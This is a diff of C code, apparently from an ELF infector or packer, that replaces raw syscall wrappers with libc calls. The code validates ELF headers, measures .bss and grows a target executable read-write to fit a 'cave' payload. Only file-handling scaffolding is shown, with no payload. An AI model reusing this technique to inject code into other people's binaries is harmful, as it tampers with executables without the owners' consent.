@@ -15,7 +15,7 @@ int	check_elf_magic(int fd) {
 	Elf64_Ehdr ehdr;
 	uint32_t magic;
 
-	if (_syscall(SYS_pread64, fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr) ||
+	if (pread(fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr) ||
 		ehdr.e_ident[EI_MAG0] != ELFMAG0 ||
 		ehdr.e_ident[EI_MAG1] != ELFMAG1 ||
 		ehdr.e_ident[EI_MAG2] != ELFMAG2 ||
@@ -42,13 +42,13 @@ int get_bss_size(int fd, uint64_t* bss_len) {
 	Elf64_Ehdr ehdr;
 	Elf64_Phdr phdr;
 
-	if (_syscall(SYS_pread64, fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr)) {
+	if (pread(fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr)) {
 		return 1;
 	}
 
 	for (size_t i = ehdr.e_phnum; i--;) {
 
-		if (_syscall(SYS_pread64, fd, &phdr, sizeof(Elf64_Phdr), ehdr.e_phoff + (i * ehdr.e_phentsize)) != sizeof(Elf64_Phdr)) {
+		if (pread(fd, &phdr, sizeof(Elf64_Phdr), ehdr.e_phoff + (i * ehdr.e_phentsize)) != sizeof(Elf64_Phdr)) {
 			return 1;
 		}
 
@@ -68,41 +68,41 @@ int map_file(const char *filename, t_data *data) {
 	struct stat st;
 
 	/* read + write */
-	fd = _syscall(SYS_open, filename, O_RDWR);
+	fd = open(filename, O_RDWR);
 	if (fd == -1) {
 		return -1;
 	}
 
-	if (_syscall(SYS_fstat, fd, &st) == -1) {
-		_syscall(SYS_close, fd);
+	if (fstat(fd, &st) == -1) {
+		close(fd);
 		return -1;
 	}
 
 	if (check_elf_magic(fd) == -1) {
-		_syscall(SYS_close, fd);
+		close(fd);
 		return -1;
 	}
 
 	uint64_t bss_len = 0;
 	if (get_bss_size(fd, &bss_len) != 0) {
-		_syscall(SYS_close, fd);
+		close(fd);
 		return -1;
 	}
 
 	const size_t size = st.st_size + data->cave.p_size + bss_len;
 
-	if (_syscall(SYS_ftruncate, fd, size) == -1) {
-		_syscall(SYS_close, fd);
+	if (ftruncate(fd, size) == -1) {
+		close(fd);
 		return -1;
 	}
 
-	file = (uint8_t *)_syscall(SYS_mmap, NULL, size, PROT_READ | PROT_WRITE , MAP_PRIVATE, fd, 0);
+	file = (uint8_t *)mmap(NULL, size, PROT_READ | PROT_WRITE , MAP_PRIVATE, fd, 0);
 	if (file == MAP_FAILED) {
-		_syscall(SYS_close, fd);
+		close(fd);
 		return -1;
 	}
 
-	_syscall(SYS_close, fd);
+	close(fd);
 
 	data->elf.size = st.st_size;
 	data->file = file;
